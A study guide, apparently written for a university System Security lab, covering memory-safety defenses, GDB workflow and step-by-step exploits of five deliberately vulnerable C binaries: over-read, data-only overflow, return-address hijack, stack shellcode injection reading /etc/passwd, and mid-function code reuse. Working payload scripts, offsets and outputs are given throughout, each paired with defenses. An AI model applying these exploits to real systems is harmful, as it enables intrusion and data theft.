**Control-Flow Integrity (CFI)** restricts indirect branches (`call *`, `jmp *`,
`ret`) to a set of valid targets determined statically or at runtime. A coarse CFI
would allow only valid function entry points; a fine-grained one checks type
signatures. **Shadow stack** stores return addresses in a separate, protected stack;
on `ret`, the CPU compares/restores the protected value. Intel CET provides hardware
shadow stacks; `endbr64` at function entries is part of CET's indirect-branch
tracking. Limitations: CFI does not stop data-only attacks; shadow stacks protect
returns but not arbitrary function pointers; both rely on complete enforcement and
protected metadata (*System Security* slide 47).

#### Pointer encryption / pointer authentication

Encrypt pointers stored in memory (e.g. return addresses or function pointers) with
a per-process key, so a corruption writes ciphertext that fails authentication.
The lecture's example uses XOR (and notes XOR is not good encryption); real designs
use tweakable encryption/MACs. It is irrelevant to this lab because the binaries are
compiled without it, and the return address is stored in plaintext.

#### Memory tagging (ARM MTE), fat pointers, guard pages

- **Fat pointers** carry base/bound/key metadata and are checked on dereference
  (*System Security* slide 17).
- **ARM MTE** associates a 4-bit tag with each 16-byte granule and checks the
  pointer tag on access (*System Security* slide 18).
- **Guard pages** make a page inaccessible next to a buffer; any access faults
  (*System Security* slide 14). Linux does not guard every stack frame, so small
  overflows are not caught.

#### Safe languages and safe coding

Memory-safe languages (Java, Python, Rust, ML) prevent these bugs by construction
(strong typing, bounds checks, ownership/borrowing), at a cost in performance,
memory and predictability; Rust's guarantees depend on `unsafe` code and libraries
being correct. In C, the lecture recommends (*System Security* slide 8):

- check capacity before every read/write;
- validate lengths and check integer overflow in size calculations;
- handle allocation failures;
- define ownership and lifetime;
- account for the NUL terminator and truncation;
- use safer variants such as `strncpy` (but note it may not NUL-terminate).

Static analysis, formal verification (seL4, Frama-C), fuzzing, symbolic execution and
dynamic tools (Valgrind/Memcheck) are also covered in the lecture. Testing can reveal
defects in exercised executions but **passing tests does not prove absence of bugs**
(*System Security* slides 9–12).

### 3.12 What each defense actually guarantees

This table is directly from *System Security* slide 47; learn it, because it is an
easy exam question:

| Defense | Guarantee | Key assumptions | Remaining attacks |
|---|---|---|---|
| Memory-safe language | prevents invalid memory accesses in safe code | sound implementation, trusted unsafe interfaces | logic errors, side channels, unsafe-code bugs |
| Stack canary | detects changes to the canary before a protected return | canary remains secret; overwrite crosses it; check executes | canary disclosure, writes that bypass it, data corruption |
| W⊕X | prevents writable and executable mappings of the same memory | correct page permissions, control of writable aliases | ROP, data-only attacks, abuse of permission changes |
| ASLR | makes target addresses harder to predict | sufficient randomness, no useful address disclosure | information leaks, guessing, relative overwrites |
| CFI / shadow stack | restricts indirect targets / protects return addresses | complete enforcement, protected metadata | abuse of allowed targets, data-only attacks |
| Isolation / sandbox | restricts a compromised component's access | correct enforcement, limited permissions | abuse of permitted operations, interface bugs, sandbox escape |

The one-line summary to memorize:

> **Canary protects control metadata; NX prevents code injection; ASLR hides
> addresses; none of them stops a data-only attack; and all of them can be defeated
> by a leak or by code reuse if the assumptions fail.**

---


## 4. Tooling and methodology

### 4.1 The GDB workflow used for every task

```bash
cd task3
gdb -q ./main.elf
```

Useful commands:

| GDB command | Meaning |
|---|---|
| `b main.c:35` | break at source line 35 (debug symbols exist because of `-ggdb`) |
| `b check_user` | break at function entry |
| `b *0x401a46` | break at an exact address (useful for `ret` and gadgets) |
| `run < input.txt` | run with stdin from a file |
| `run arg1 arg2` | run with argv |
| `next` / `step` / `continue` | step over / step into / resume |
| `p &name` | address of a local variable |
| `p/x $rbp`, `p/x $rsp`, `p/x $rip` | current frame/stack/instruction pointer |
| `x/8gx $rbp-16` | examine 8 8-byte words in hex |
| `x/s 0x49e02c` | examine a C string |
| `x/a 0x4010` | examine an address-sized value (follow a pointer) |
| `info frame` | locals, saved `rbp`, saved `rip`, previous frame |
| `info line *0x...` | map an address to source line |
| `disassemble /m check_user` | disassembly interleaved with source |
| `set pagination off` | no `--More--` prompts (essential in batch) |
| `set disable-randomization off` | let ASLR vary inside GDB (GDB disables it by default) |

Example that measures the task 3 frame:

```gdb
$ gdb -q ./main.elf
(gdb) set pagination off
(gdb) b check_user
(gdb) run < /tmp/in3.txt
Breakpoint 1, check_user (uname=0x7fffffffe040 "AAAA", ...) at main.c:16
(gdb) next 4
(gdb) p/x $rbp                 # 0x7fffffffdfa0
(gdb) p &name                  # 0x7fffffffdf94
(gdb) info frame
Stack level 0, frame at 0x7fffffffdfb0:
 rip = 0x555555555287 in check_user (main.c:25); saved rip = 0x555555555334
 Saved registers:
  rbp at 0x7fffffffdfa0, rip at 0x7fffffffdfa8
```

Now the offset is literally `0x...dfa8 - 0x...df94 = 0x14 = 20`. No guessing.

### 4.2 Three ways to find an offset

1. **GDB + `info frame`**: `p &buffer`, then `info frame` gives the saved `rip`
   address; subtract.
2. **Disassembly**: find the `lea rax, [rbp-0xNN]` that computes the buffer address,
   and the epilogue `leave; ret`. The saved `rip` is at `[rbp+8]`; offset =
   `0xNN + 8` (plus any locals placed between).
3. **Cyclic pattern**: send a De Bruijn sequence (`cyclic 200` in pwndbg, or
   `pattern_create.rb`), crash, and read the value of `rip`; the offset is the
   position of that pattern in the input. This is the standard method when the
   layout is unknown.

For this lab, methods 1 and 2 are enough because all binaries have debug symbols and
are compiled at `-O0`.

---


### 4.3 Finding code addresses and offsets

```gdb
(gdb) p/x &print_my_pwd            # 0x11e9
(gdb) p/x &main                    # 0x1289
(gdb) p (long)&print_my_pwd-(long)main   # -160
```

At runtime the PIE base is added to both, so the difference is constant. The scripts
read the leaked runtime `main` and add the static difference:

```python
pmain = int(sys.stdin.readline(), 16)
p_print_my_pwd = pmain + (-160)
```

For task 7 (non-PIE), `&main` is always `0x401a47`; the script still reads the leak
because the template does, but it could hard-code the value.

### 4.4 Finding gadgets

```bash
r2 -q -c '/R pop rdi' task7/main.elf     # search for ROP gadgets
r2 -q -c '/R call 0x413c40' main.elf     # find calls to puts
ROPgadget --binary task7/main.elf | grep 'pop rdi'
objdump -d -M intel task7/main.elf --start-address=0x4334b0 --stop-address=0x4334c0
```

The task 7 gadget is at `0x4334b8`:

```asm
4334b7: 41 5f          pop r15
4334b9: 5d             pop rbp
4334ba: c3             ret
```

Starting one byte later, at `0x4334b8`, the bytes are `5f 5d c3`:

```asm
4334b8: 5f             pop rdi
4334b9: 5d             pop rbp
4334ba: c3             ret
```

This is the "gadget inside an instruction" trick. `objdump` from the function start
will not show it; disassemble at the gadget address or use `r2`.

### 4.5 The FIFO / pipe choreography

Every scripted task uses the same shell pattern:

```bash
./solutionN.py < my.fifo | ./main.elf 2>my.fifo
```

```
   solutionN.py  --stdout-->  main.elf  --stdin-->
        ^                         |
        |                         | stderr (leak)
        +---------- my.fifo <-----+
```

- `my.fifo` is a **named pipe** created by `make` (`[ -p $@ ] || mkfifo $@`).
- `main.elf` writes the leaked address to `stderr`, which is redirected into the
  FIFO.
- `solutionN.py` reads that line from `stdin` (the FIFO), computes the payload, and
  writes it to `stdout`, which is the pipe into `main.elf`'s `stdin`.
- The script reads the leak **before** writing input, so there is no deadlock and
  the address belongs to the same process that will execute the payload.
- `eprint(...)` writes diagnostics to `stderr`, not to the payload stream. Mixing
  debug output into `stdout` would corrupt the payload.

Why not `$(./main.elf)`? Because the leak is produced only after the program starts,
and the program needs the payload to proceed; the FIFO breaks the circular
dependency.

### 4.6 Payload builder helpers

All solution scripts define:

```python
def writeStr(v):        # ASCII text (for the password / filename lines)
def writeBytes(v):      # raw bytes (shellcode, binary payload)
def writeLong(v):       # 8-byte little-endian integer
def eprint(*args):      # debug to stderr
```

`sys.stdout.buffer.write` is used instead of `print` so that NUL bytes and
non-ASCII bytes are preserved and no newline is added. `flush()` after each write
avoids buffering deadlocks in the pipe.

### 4.7 Troubleshooting table

| Symptom | Likely cause | Fix |
|---|---|---|
| No leaked password, just `Segmentation fault` | stdout is a pipe and buffered; crash before flush | run under `unbuffer` / `stdbuf -o0`; `test.py` already uses `unbuffer` |
| Attack works sometimes, fails sometimes | ASLR produced `0x0a` (newline) or `0x00` in a payload address; `gets`/`strcpy` truncates | rerun; use a file channel (`fread`) if possible |
| `make attack` hangs | FIFO opened in the wrong order, or script waiting for a line that never comes | check `2>my.fifo` and that the program actually prints the leak |
| Wrong target address / crash at `ret` | offset computed from the wrong frame, or endianness wrong | re-measure with `info frame`; use `to_bytes(8,'little')` |
| `strcpy` copies only part of the address | NUL byte inside the address | high bytes of a canonical address are zero; the terminating NUL completes them; ensure no earlier zero byte |
| `make: *** Error 139` | SIGSEGV after the leak (expected for tasks 3, 5, 6, 7) | test.py checks output, not exit code |
| `make: *** Error 1` in task 4 | shellcode calls `exit(1)` | expected; output is still correct |
| `Bus error` in task 5 | hijacked `ret`/`leave` produced a misaligned/invalid access | expected after the leak |
| GDB shows different addresses each run | ASLR; GDB normally disables it | `set disable-randomization off` to observe, or ignore because offsets are constant |

---


## 5. Task-by-task deep dive

### 5.1 Task 1 — buffer over-read

**Goal (README):** forge two command-line arguments that make the application leak
the internally stored password. Solution file: `task1/solution1.txt`.

**Source (`task1/main.c`):**

```c
int main(int argc, char ** argv) {
  char pwd[8];
  char name[8];
  int i,n = 0;

  if (argc < 3) { ... }

  strcpy(pwd, "pwd0");
  strcpy(name, argv[1]);
  n = atoi(argv[2]);
  write(1, name, n);       // <-- vulnerability: n is not bounded by sizeof(name)
  write(1, "\n", 1);
  return 0;
}
```

**Measured layout (GDB, `b main.c:19`):**

| Object | Address | Size | Notes |
|---|---|---|---|
| `name` | `rbp-0x14` (`...e09c`) | 8 | lower address |
| `pwd` | `rbp-0xc` (`...e0a4`) | 8 | immediately after `name` |
| `n` | `rbp-0x4` (`...e0ac`) | 4 | after `pwd` |
| saved `rbp` | `[rbp]` (`...e0b0`) | 8 | |
| saved `rip` | `[rbp+8]` (`...e0b8`) | 8 | |

The distance from `name` to `pwd` is **8 bytes**. The program writes `pwd0` first,
then copies the attacker's name into `name`. Since `write` takes an explicit length,
nothing stops it from reading past `name` into `pwd` (and further).

**Solution (`task1/solution1.txt`):**

```
hello 16
```

**Why 16?** `name` is 8 bytes and `pwd` is the next 8 bytes, so 16 bytes starting at
`name` cover both objects exactly. 5 bytes would print only `hello`; 16 prints
`hello\0...pwd0...`.

Observed:

```text
$ ./main.elf hello 16 | xxd
00000000: 6865 6c6c 6f00 3421 7077 6430 001f 3421  hello.4!pwd0..4!
00000010: 0a                                       .
```

(`\0` at offset 5 terminates the C string, but `write` does not care; bytes 6–7 are
uninitialized padding, then `pwd0` at offset 8. The test only searches for the bytes
`pwd0`, which are present.)

**Why it works:**

- `write(1, name, n)` performs a raw write of `n` bytes; it has no idea that `name`
  is only 8 bytes. This is a **spatial** memory-safety violation (out-of-bounds
  read).
- `atoi(argv[2])` lets the attacker choose `n`; there is no check `n <= sizeof(name)`.
- The compiler placed `pwd` directly after `name` on the stack, so the secret is
  adjacent and gets copied to stdout.
- `write` (unlike `printf("%s", ...)`) does not stop at the NUL after `hello`, so the
  NUL does not protect the secret. This is a great detail to mention: the same
  over-read through `printf("%s")` would stop at `hello` unless the name fills the
  buffer without a terminator.

**What it is not:** it is not an overflow (nothing is written out of bounds), it is
not a control-flow hijack, and it does not depend on ASLR (the stack layout is
relative; the absolute addresses change but the distance does not).

**Defenses that would help:** a bounds check on `n` (`if (n > sizeof(name)) n =
sizeof(name);`), `printf("%.*s", (int)sizeof(name), name)`, `fwrite` with a checked
length, or using a length-aware string type. ASLR/NX/canary do **not** help against
an over-read. Guard pages could turn a large over-read into a fault, but a small
read of the adjacent variable stays within the same page.

**Likely TA questions:**

- *Why does `hello 5` not leak?* Because only the first 5 bytes of `name` are
  written; `pwd` starts at byte 8.
- *Why does `hello 16` leak exactly `pwd0`?* `name` is bytes 0–7, `pwd` is bytes
  8–15; the second 8-byte chunk is `pwd0\0...`.
- *Would `n = 12` work?* Yes; it prints `name` (8) plus the first 4 bytes of `pwd`
  (`pwd0`), which already contains the secret. 16 is just a clean choice.
- *What if `n = 32`?* It also prints `n`, saved `rbp`, and saved `rip` bytes; it may
  leak addresses (and possibly crash at a page boundary). The lecture's example
  `./main roberto 32` shows `roberto...pwd0...` plus more.
- *How would you fix it?* Bound `n` by the object size and use a length-aware API;
  do not trust `atoi`.
- *Why is `write` used instead of `printf`?* To make the over-read obvious: `write`
  copies exactly `n` bytes, including NULs and binary data; `printf("%s")` stops at
  a NUL.

---


### 5.2 Task 2 — buffer overflow / authentication bypass

**Goal (README):** forge two command-line arguments that authenticate with a wrong
password. Solution file: `task2/solution2.txt`.

**Source (`task2/main.c`):**

```c
int main(int argc, char ** argv) {
  char pwd[8];
  char name[8];
  ...
  strcpy(pwd, "pwd0");
  strcpy(name, argv[1]);        // <-- no bound: can overwrite pwd
  printf("Hello %s\n", name);

  if (strcmp(pwd, argv[2]))     // 0 means equal -> authorized
    printf("non authorized\n");
  else
    printf("authorized\n");
  return 0;
}
```

**Measured layout:**

| Object | Address | Size | Notes |
|---|---|---|---|
| `name` | `rbp-0x10` (`...e090`) | 8 | lower address |
| `pwd` | `rbp-0x8` (`...e098`) | 8 | immediately after `name` |
| saved `rbp` | `[rbp]` (`...e0a0`) | 8 | |
| saved `rip` | `[rbp+8]` (`...e0a8`) | 8 | not reached by this payload |

**Solution (`task2/solution2.txt`):**

```
AAAAAAAAXXX XXX
```

The first token is `argv[1]` (username), the second is `argv[2]` (password).

**Byte-level construction:**

```
name[0..7]  = A A A A A A A A        (8 bytes, fills the buffer completely)
pwd[0..2]   = X X X                  (overwrites the first 3 bytes of "pwd0")
pwd[3]      = \0                     (the terminator written by strcpy)
```

`strcpy` writes 11 characters plus the terminating NUL = **12 bytes**. `name` is 8
bytes, so bytes 8–10 overwrite `pwd[0..2]` with `X`, and byte 11 writes `pwd[3] =
'\0'`. The remaining bytes `pwd[4..7]` are stale/uninitialized, but `strcmp` stops
at `pwd[3]`, so the effective stored password is exactly `"XXX"`.

`argv[2]` is also `"XXX"`, so `strcmp("XXX", "XXX") == 0`, the `if` is false, and
the program prints `authorized`.

Observed:

```text
$ ./main.elf AAAAAAAAXXX XXX
Hello AAAAAAAAXXX
authorized

$ ./main.elf AAAAAAAAXXX pwd0
Hello AAAAAAAAXXX
non authorized
```

The `Hello` line itself is evidence of the adjacency: `name` has no NUL within its
8 bytes, so `printf("%s", name)` continues into `pwd` and prints `AAAAAAAAXXX`.

**Why it works:**

- `strcpy` has no destination bound; 11 characters + NUL is more than the 8-byte
  `name`.
- The compiler placed `pwd` immediately after `name`, so the overflow changes the
  **data** used by the authentication check.
- The write stays below saved `rbp`/`rip`; this is a **data-only attack**, not a
  control-flow hijack. The program exits normally.
- The attacker does not need to know any address, so ASLR and PIE are irrelevant.

**Defenses that would help:** check `strlen(argv[1]) < sizeof(name)`, use
`strncpy`/`snprintf`, keep secrets out of the same stack frame/adjacent memory, or
compare a hash rather than a mutable buffer. A stack canary does **not** help here
(the overflow never reaches the canary), NX does not help, and ASLR does not help.
This is the key counter-example to "just enable canary and ASLR".

**Likely TA questions:**

- *Why exactly 11 characters?* 8 fill `name`; 3 overwrite the first three bytes of
  `pwd`; the NUL from `strcpy` terminates `pwd` after `XXX`.
- *Why not `AAAAAAAAXXXX`?* That would make `pwd = "XXXX"`, so the password argument
  would need to be `XXXX`; both work. The number of X's must match the password
  argument.
- *Why is the stored password not `pwd0` anymore?* `strcpy` writes sequentially into
  `name` and continues into the adjacent `pwd` object.
- *Does this overflow the return address?* No: 11 chars + NUL reaches only `pwd[3]`;
  saved `rbp` is 16 bytes after the start of `name`, and saved `rip` 24 bytes after.
- *Would a canary stop it?* No. The canary sits above the locals (between locals and
  saved `rbp`); this write never reaches it. It is a data-only corruption.
- *How to fix?* Bound the copy; do not store the password next to the username;
  use a constant-time comparison on a hash; validate input length.

---


### 5.3 Task 3 — control-flow hijacking to `print_my_pwd`

**Goal (README):** forge a username that makes the application leak the internally
stored password. Solution file: `task3/solution3.py`.

**Source (`task3/main.c`):**

```c
char * pwd = "pwd0";

void print_my_pwd() {
  printf("your pwd is: %s\n", pwd);
}

int check_user(char * uname, char * upwd) {
  char name[12];
  strcpy(name, uname);            // <-- overflow: uname is attacker-controlled

  if (strcmp(pwd, upwd)) {
    printf("non authorized\n");
    return 1;
  }
  printf("authorized\n");
  print_my_pwd();
  return 0;
}

int main(...) {
#ifdef DEBUG
  fprintf(stderr, "%p\n", main);  // <-- leaks the PIE base (via main)
#endif
  char name[128];
  char pass[128];

  printf("Name? \n");  gets(name);     // <-- unbounded read (but buffer is 128)
  printf("Password? \n"); gets(pass);
  printf("Hello %s\n", name);
  check_user(name, pass);              // <-- overflow happens here
  printf("End\n");
}
```

Two bugs combine:

1. `gets` has no bound, but `main`'s `name` is 128 bytes; the payload is shorter than
   that, so `main` survives.
2. `check_user` copies `uname` into a **12-byte** buffer with `strcpy`; the same
   payload is now much larger than 12 bytes and overwrites `check_user`'s frame.

**Measured layout:**

| Frame | Object | Address | Size |
|---|---|---|---|
| `main` | `name` | `rbp-0x80` (`...e040`) | 128 |
| `main` | `pass` | `rbp-0x100` (`...dfc0`) | 128 |
| `check_user` | `name` | `rbp-0xc` (`...df94`) | 12 |
| `check_user` | saved `rbp` | `[rbp]` (`...dfa0`) | 8 |
| `check_user` | saved `rip` | `[rbp+8]` (`...dfa8`) | 8 |

So the distance from the start of `check_user`'s `name` to the saved return address
is **12 + 8 = 20 bytes** (there is no padding in this frame).

**Addresses (non-randomized offsets):**

```text
main          = 0x1289
print_my_pwd  = 0x11e9
offset        = 0x11e9 - 0x1289 = -0xa0 = -160
```

`print_my_pwd` is *before* `main` in the text section, hence the negative offset.
The script reads the runtime `main` from the DEBUG leak and computes the runtime
`print_my_pwd`.

**Solution (`task3/solution3.py`), annotated:**

```python
pmain = int(sys.stdin.readline(), 16)          # read leaked "0x55..."
offset_main_to_print_my_pwd = -160             # &print_my_pwd - &main (static)
offset_name_to_rip = 20                        # &name -> saved rip in check_user
p_print_my_pwd = pmain + offset_main_to_print_my_pwd

payload = b"A" * offset_name_to_rip + p_print_my_pwd.to_bytes(8, 'little')
writeBytes(payload + b"\n")                    # username
writeStr("wrongpassword\n")                    # password (irrelevant)
```

**Payload diagram:**

```
bytes 0..19       20 x 'A'          fills name[12] + saved rbp (8)
bytes 20..27      address of print_my_pwd, little-endian
byte 28           '\n' from gets (replaced by '\0')
```

Example runtime address `0x560db2e301e9` → bytes `e9 01 e3 b2 0d 56 00 00`.

---


**The NUL-byte subtlety (important):** the address contains two zero bytes at the
top. `gets` reads raw bytes and can store NULs, but the subsequent
`strcpy(name, uname)` stops at the **first NUL**. The address bytes are
`e9 01 e3 b2 0d 56 00 00`; the first zero is byte 6 of the address (payload offset
26). `strcpy` copies 26 bytes (20 A's + 6 address bytes) and then writes the
terminating NUL at payload offset 26. The saved return address therefore becomes:

```
e9 01 e3 b2 0d 56 00 ??    where ?? was already 0x00
```

The high byte at offset 27 was zero in the original saved `rip` (canonical user-space
addresses are below 2^47), so the full 8-byte address is correct. If the address had
a zero byte earlier (e.g. low byte `0x00`) or a newline byte, the exploit would fail
and you would rerun.

**Observed result:**

```text
Name?
pmain          = 0x560db2e30289
p_print_my_pwd = 0x560db2e301e9
Password?
Hello AAAAAAAAAAAAAAAAAAAA...
non authorized
your pwd is: pwd0
Segmentation fault (core dumped)
```

The password is wrong, so `check_user` prints `non authorized`, then returns. The
overwritten return address sends it to `print_my_pwd` instead of back to `main`.
After printing, `print_my_pwd` executes its own `pop rbp; ret`; the stack is
corrupted (saved `rbp` was 8 A's), so the process crashes. The leak has already
happened, which is all the task requires.

**Why it works:**

- `check_user`'s local `name` is 12 bytes; `strcpy` writes the whole username,
  including 20 bytes of padding and 8 address bytes.
- The saved return address is at `rbp+8`, exactly 20 bytes after `name`.
- `ret` pops the overwritten value into `rip`; the CPU jumps to `print_my_pwd`.
- The DEBUG print gives the PIE base; the offset between `main` and `print_my_pwd`
  is constant, so ASLR is defeated.
- The password check is irrelevant: the hijack happens on function return, after the
  check has already failed.

**Defenses that would help:** `fgets(name, sizeof(name), stdin)` instead of `gets`;
`strncpy`/`snprintf` with a bound in `check_user`; stack canary (the write crosses
it); ASLR without the DEBUG leak (but the leak defeats it); shadow stack/CFI (the
return target is not a valid return address); removing the DEBUG output. NX does
**not** help: `print_my_pwd` is existing executable code.

**Likely TA questions:**

- *Why does the overflow happen in `check_user`, not in `main`?* `main`'s buffer is
  128 bytes and the payload is only ~28 bytes, so `gets` is safe there; `check_user`
  copies the same string into a 12-byte buffer and overflows.
- *Why 20 and not 12?* `name[12]` + 8 bytes of saved `rbp` = 20; the saved `rip`
  starts at offset 20.
- *Why is the saved `rbp` filled with A's?* Because the padding to reach `rip` passes
  through it. It is not used before the hijack, but it makes the eventual return
  crash.
- *What happens after `print_my_pwd` returns?* It returns to whatever is on the stack
  after the overwritten return address (main's locals/garbage), so it crashes. The
  task explicitly says that is fine.
- *Why not jump to `check_user` with the correct password?* You do not know the
  password; the point is to bypass the check by jumping directly to the printing
  function.
- *What if the password is correct?* The program would call `print_my_pwd` normally,
  but the overflow would still corrupt the return address and crash afterward; the
  hijack is not needed in that case.
- *Why does `gets` not stop at the NUL bytes in the address?* `gets` reads bytes
  until newline; NUL is a normal byte to it. The truncation happens later in
  `strcpy`, as explained above.

---


### 5.4 Task 4 — code injection with shellcode

**Goal (README):** forge a subject and body that make the application execute the
provided shellcode (`shell.bin`), which reads `/etc/passwd`. Solution file:
`task4/solution4.py`.

*Naming note:* the README calls the file `shell.py`, but the actual source is
`task4/shell.asm`, assembled by `nasm -f bin -o shell.bin shell.asm`. Say
`shell.asm`/`shell.bin` in the presentation; the `.py` is a README typo.

**Source (`task4/main.c`):**

```c
void get_mail() {
  char mail_subject[32];
  char mail_body[128];

#ifdef DEBUG
  fprintf(stderr, "%p\n", &mail_subject);   // leaks a stack address
#endif

  printf("Enter the mail subject:\n");
  gets(mail_subject);                        // first input, 32-byte buffer
  printf("Enter the mail body:\n");
  gets(mail_body);                           // <-- overflow, 128-byte buffer
}

int main(...) {
  get_mail();
  printf("Sending the email\n");
}
```

**Measured layout in `get_mail`:**

| Object | Address | Size | Notes |
|---|---|---|---|
| `mail_body` | `rbp-0xa0` (`...e000`) | 128 | lower address |
| `mail_subject` | `rbp-0x20` (`...e080`) | 32 | 128 bytes after body |
| saved `rbp` | `[rbp]` (`...e0a0`) | 8 | |
| saved `rip` | `[rbp+8]` (`...e0a8`) | 8 | |

Distance `mail_body` → saved `rip` = `0xa8` = **168 bytes** = 128 (body) + 32
(subject) + 8 (saved `rbp`). Distance `mail_subject` → `mail_body` = `0x80` = **128
bytes**, so `mail_body_address = leaked_subject_address - 128`.

**Why leak the subject?** The shellcode is placed on the stack and the return address
must point to it. ASLR randomizes the stack, so the script needs one stack address.
The DEBUG output conveniently prints `&mail_subject`; the body is exactly 128 bytes
below it.

**Building the body:**

```
[ 82 bytes shellcode ][ 86 bytes 'A' padding ][ 8-byte address of mail_body ][ '\n' ]
                       ^ 168 - 82 = 86         ^ overwrites saved rip
```

Total body payload = 82 + 86 + 8 = **176 bytes**. `gets` reads until the newline and
writes all 176 bytes starting at `mail_body`; the first 168 reach the saved return
address, which is replaced by the address of the start of `mail_body` (where the
shellcode begins).

**Solution script, annotated:**

```python
with open("shell.bin", "rb") as f:
    payload = f.read()                       # 82 bytes of machine code

psubject = int(sys.stdin.readline(), 16)     # leaked &mail_subject
p_mail_body = psubject - 128                  # body is 128 bytes lower

offset_to_rip = 168
body_exploit = payload + b"A" * (offset_to_rip - len(payload)) \
               + p_mail_body.to_bytes(8, 'little')

writeStr("hello\n")                          # subject: short, no overflow
writeBytes(body_exploit + b"\n")             # body: shellcode + padding + address
```

**Why the stack must be executable:** `get_mail` returns to `mail_body`, i.e. to
data on the stack. With NX enabled the CPU would fault on the first instruction
fetch. The Makefile uses `-z execstack`, which produces `GNU_STACK ... RWE`. This is
the one task that is pure **code injection**; the lecture's W^X defense directly
targets it.

**Observed result:**

```text
$ unbuffer make attack
Enter the mail subject:
psubject    = 0x7fff70b56120
p_mail_body = 0x7fff70b560a0
shellcode size = 82 bytes
body payload size = 176 bytes
Enter the mail body:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

`make attack` exits with `Error 1` because the shellcode's `exit` uses `rdi = 1`
(status 1). `test.py` catches the output and checks `b"root:" in res`, so the test
passes.

**Why it works:**

- `gets(mail_body)` has no bound; 176 bytes is far more than 128.
- The saved return address is 168 bytes after the body, so the address at the end of
  the payload lands exactly on `rip`.
- The return address is `&mail_body`, which the script computes from the leaked
  `&mail_subject` minus 128.
- The stack is executable, so fetching instructions from `mail_body` succeeds.
- The shellcode is position-independent and contains no NUL/newline bytes; it does
  not need any absolute addresses.

**Defenses that would help:** NX/W^X (the decisive one), `fgets(mail_body, sizeof
mail_body, stdin)`, a stack canary (the write crosses it), removing the DEBUG leak,
and not making the stack executable. ASLR alone is defeated by the leak. CFI/shadow
stack would also stop the return-address hijack.

**Likely TA questions:**

- *Why return to the body and not to the subject?* The shellcode is placed at the
  start of the body; the leaked subject is only used to compute the body address.
- *Why 128 between subject and body?* The compiler allocated `body[128]` at
  `rbp-0xa0` and `subject[32]` at `rbp-0x20`; the difference is `0x80`.
- *Why 168 to the return address?* body 128 + subject 32 + saved `rbp` 8 = 168.
- *What if the shellcode had a NUL byte?* `gets` would still store it, but a later
  C-string function (`strcpy`/`strlen`) would stop; here the body is read by `gets`
  and never copied, so NUL would be tolerated, but a newline (`0x0a`) would stop
  `gets`. The provided shellcode avoids both.
- *Would this work with NX enabled?* No; the CPU would raise a protection fault when
  fetching the first shellcode byte from the stack. You would need ROP/ret2libc
  instead (tasks 6/7).
- *What does `-z execstack` do?* It marks the stack executable in the ELF's
  `GNU_STACK` header; the kernel maps the stack `RWE`.
- *Why not use the shellcode to spawn a shell?* The provided payload reads
  `/etc/passwd`; the exploit mechanism is identical, only the payload differs.

---


### 5.5 Task 5 — partial code reuse inside `check_user`

**Goal (README):** forge a username that leaks the password. Unlike task 3, there is
**no** `print_my_pwd` function. Solution file: `task5/solution5.py`.

**Source (`task5/main.c`, relevant part):**

```c
char * pwd = "pwd0";

int check_user(char * uname, char * upwd) {
  char name[12];
  strcpy(name, uname);              // <-- overflow

  if (strcmp(pwd, upwd)) {
    printf("non authorized\n");
    return 1;
  }
  printf("authorized\n your password is: ");
  puts(pwd);                        // <-- the leak we want to reach
  return 0;
}

int main(...) {
  fprintf(stderr, "%p\n", main);    // leak
  char name[128], pass[128];
  gets(name); gets(pass);
  printf("Hello %s\n", name);
  check_user(name, pass);
  ...
}
```

**Disassembly of `check_user`:**

```asm
11e9 <check_user>:
 ...
120b: call strcpy
1210: mov rax, [rip+0x2df9]      # 4010 <pwd>   (load pointer value)
1217: mov rdx, [rbp-0x20]        # upwd
121b: mov rsi, rdx
121e: mov rdi, rax
1221: call strcmp
1226: test eax,eax
1228: je 1240                    # equal -> authorized branch
122a: ... "non authorized"
1240: lea rax, [rip+0xdd9]       # "authorized\n your password is: "
1247: mov rdi, rax
124a: mov eax, 0
124f: call printf
1254: mov rax, [rip+0x2db5]      # <-- TARGET: load pwd pointer
125b: mov rdi, rax               # <-- argument for puts
125e: call puts                  # <-- puts(pwd)
1263: mov eax, 0
1268: leave
1269: ret
```

The target address is `0x1254`, the instruction that loads the **global `pwd`
pointer** into `rax`; the next instructions move it to `rdi` and call `puts`. We
jump into the middle of the function, after the `strcmp` branch, so the password
check is completely bypassed.

**Addresses:**

```text
main        = 0x126a
target      = 0x1254
offset      = 0x1254 - 0x126a = -0x16 = -22
check_user  = 0x11e9
target      = check_user + 0x6b = check_user + 107
```

So `target = main - 22`. The solution's comment `p (char*)&check_user + (0x1254 -
0x11e9) - (char*)&main = -22` is just a long way of saying the same thing.

**Frame:** identical to task 3: `name` at `rbp-0xc`, saved `rip` at `rbp+8`,
distance **20**.

**Solution (`task5/solution5.py`):**

```python
pmain = int(sys.stdin.readline(), 16)
offset_main_to_puts_pwd = -22
p_puts_pwd = pmain + offset_main_to_puts_pwd

payload = b"A" * 20 + p_puts_pwd.to_bytes(8, 'little')
writeBytes(payload + b"\n")     # username
writeStr("wrongpassword\n")      # password
```

**Payload diagram:**

```
[ 20 bytes 'A' ][ 8-byte address of the `mov rax,[pwd]` instruction ][ '\n' ]
```

Example: `pmain = 0x58ad0547926a` → target `0x58ad05479254` → bytes
`54 92 47 05 ad 58 00 00`. The same NUL/newline caveat as task 3 applies:
`gets` stops at `0x0a`, and `strcpy` stops at the first `0x00`; the two high zero
bytes of the canonical address are completed by `strcpy`'s terminator.

**Observed result:**

```text
Name?
pmain       = 0x58ad0547926a
p_puts_pwd  = 0x58ad05479254
Password?
Hello AAAAAAAAAAAAAAAAAAAA...
non authorized
pwd0
Bus error (core dumped)
```

The password is wrong; `check_user` prints `non authorized`, then returns to
`0x1254`; `puts(pwd)` prints `pwd0`. There is no `"authorized"` line because we
skipped the `printf` at `0x124f`. The process then dies with a bus error because
the stack frame (`leave`/`ret`) is corrupted.

**Why it works:**

- Same stack overflow and same 20-byte distance as task 3.
- The target is an **instruction inside an existing function**, not a function
  entry; it comes with the parameter setup (`mov rax, [pwd]; mov rdi, rax`) that
  `puts` needs.
- Jumping directly to `call puts` (`0x125e`) would be unreliable: `rdi` might not
  contain the password pointer at that moment. The selected instruction sequence
  guarantees `rdi = pwd`.
- The password check is skipped because we jump after the `strcmp`/branch.
- ASLR is defeated by the leaked `main`; the offset `-22` is fixed.

**Defenses:** same as task 3: bounded input, stack canary, ASLR without leak,
shadow stack/CFI. NX does not help (we reuse existing executable code).

**Likely TA questions:**

- *Why is this harder than task 3?* There is no function that prints the password;
  you must find an instruction sequence that does it and jump into the middle of a
  function.
